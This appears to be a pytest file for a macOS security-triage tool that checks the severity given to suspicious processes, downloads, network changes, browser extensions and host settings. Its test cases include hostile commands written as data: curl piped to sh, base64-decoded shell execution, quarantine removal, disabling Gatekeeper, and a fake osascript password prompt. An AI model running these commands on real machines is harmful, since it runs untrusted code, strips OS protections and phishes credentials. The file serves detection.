"""One row per shipped floor rule: the textbook-bad shape floors, the benign shape does not."""
from __future__ import annotations

import pytest

import triage
from collectors._base import Anomaly, Evidence

RULES = triage.load_rules()


def floor(collector, kind, key="k", change="added", **attrs):
    a = Anomaly(change=change, evidence=Evidence(collector, kind, key, attrs))
    triage.apply([a], RULES, set())
    return a.floor_severity


@pytest.mark.parametrize("case,expected", [
    # downloads
    (dict(collector="downloads", kind="risky_download", ext=".dmg"), "medium"),
    (dict(collector="downloads", kind="risky_download", ext=".app", codesign_status="unsigned"), "high"),
    (dict(collector="downloads", kind="download_summary", count=3), None),
    # processes: command patterns
    (dict(collector="processes", kind="process", exe="/bin/bash", commands=["bash -c 'curl -s http://x/a | sh'"]), "high"),
    (dict(collector="processes", kind="process", exe="/bin/bash", commands=["bash -c 'echo aGk= | base64 -D | sh'"]), "high"),
    (dict(collector="processes", kind="process", exe="/usr/bin/xattr", commands=["xattr -d com.apple.quarantine /tmp/x"]), "high"),
    (dict(collector="processes", kind="process", exe="/usr/bin/xattr", commands=["xattr -rc /Users/a/Downloads/x.app"]), "high"),
    (dict(collector="processes", kind="process", exe="/usr/sbin/spctl", commands=["spctl --master-disable"]), "critical"),
    (dict(collector="processes", kind="process", exe="/usr/bin/osascript",
          commands=['osascript -e \'display dialog "Enter password" default answer "" with hidden answer\'']), "critical"),
    (dict(collector="processes", kind="process", exe="/bin/chmod", commands=["chmod +x /tmp/payload"]), "high"),
    (dict(collector="processes", kind="process", exe="/bin/chmod", commands=["chmod 755 /Users/me/Downloads/run"]), "high"),
    (dict(collector="processes", kind="process", exe="/bin/chmod", commands=["chmod +x /usr/local/bin/tool"]), None),
    (dict(collector="processes", kind="process", exe="/tmp/agent", commands=["/tmp/agent"]), "high"),
    (dict(collector="processes", kind="process", exe="/Users/me/Downloads/setup", commands=["./setup"]), "high"),
    (dict(collector="processes", kind="process", exe="/private/var/folders/ab/T/x", commands=["x"]), "high"),
    (dict(collector="processes", kind="process", exe="/Applications/Slack.app/Contents/MacOS/Slack", commands=["Slack"]), None),
    (dict(collector="processes", kind="process", exe="/Users/me/.cache/gone", codesign_status="missing", commands=["gone"]), "high"),
    (dict(collector="processes", kind="process", exe="python3", codesign_status="unresolved", commands=["python3"]), None),
    # lineage
    (dict(collector="processes", kind="lineage", parent_name="Microsoft Word", child="sh"), "high"),
    (dict(collector="processes", kind="lineage", parent_name="Google Chrome Helper", child="osascript"), "high"),
    (dict(collector="processes", kind="lineage", parent_name="Terminal", child="bash"), None),
    (dict(collector="processes", kind="lineage", parent_name="Preview", child="python3", change="modified"), None),
    # network
    (dict(collector="network", kind="udp_listener", bind_addr="0.0.0.0", port=5000), "medium"),
    (dict(collector="network", kind="udp_listener", bind_addr="127.0.0.1", port=5000), None),
    (dict(collector="network", kind="outbound", command="curl", remote_port=8443), "medium"),
    (dict(collector="network", kind="outbound", command="python3.12", remote_port=443), "medium"),
    (dict(collector="network", kind="outbound", command="Google Chrome", remote_port=443), None),
    (dict(collector="network", kind="netconfig", key="netconfig|proxy", change="modified", any_enabled=True), "high"),
    (dict(collector="network", kind="netconfig", key="netconfig|proxy", change="modified", any_enabled=False), None),
    (dict(collector="network", kind="netconfig", key="netconfig|etc_resolver", change="modified", count=1), "high"),
    (dict(collector="network", kind="netconfig", key="netconfig|etc_resolver", change="added", count=0), None),
    (dict(collector="network", kind="netconfig", key="netconfig|resolvers", change="modified", nameservers=["9.9.9.9"]), None),
    # browser
    (dict(collector="browser", kind="extension", source="unpacked", host_permissions=[]), "high"),
    (dict(collector="browser", kind="extension", source="policy", host_permissions=[]), "high"),
    (dict(collector="browser", kind="extension", source="store", host_permissions=["<all_urls>"]), "medium"),
    (dict(collector="browser", kind="extension", source="store", host_permissions=["*://*/*"]), "medium"),
    (dict(collector="browser", kind="extension", source="store", host_permissions=["https://mail.google.com/*"]), None),
    (dict(collector="browser", kind="extension", source="store", host_permissions=[], change="modified"), None),
    (dict(collector="browser", kind="browser_policy", keys=["ExtensionInstallForcelist"]), "high"),
    # host security
    (dict(collector="host_security", kind="user", name="eve"), "critical"),
    (dict(collector="host_security", kind="group", change="modified", members=["a", "eve"]), "critical"),
    (dict(collector="host_security", kind="group", change="added", members=["a"]), None),
    (dict(collector="host_security", kind="remote_access", change="modified", sshd="enabled"), "high"),
    (dict(collector="host_security", kind="security", key="security|gatekeeper", change="modified", enabled=False), "critical"),
    (dict(collector="host_security", kind="security", key="security|gatekeeper", change="modified", enabled=True), None),
    (dict(collector="host_security", kind="security", key="security|profiles", change="modified", count=1), "high"),
    (dict(collector="host_security", kind="security", key="security|profiles", change="added", count=0), None),
    (dict(collector="host_security", kind="security", key="security|login_items", change="modified", count=4), "medium"),
    (dict(collector="host_security", kind="unavailable", source="sfltool"), None),
])
def test_rule_floors(case, expected):
    assert floor(**case) == expected


def test_bad_floor_in_user_rule_is_skipped():
    a = Anomaly(change="added", evidence=Evidence("x", "y", "k", {}))
    triage.apply([a], [{"id": "typo", "match": {"kind": "y"}, "floor": "hgh"}], set())
    assert a.floor_severity is None
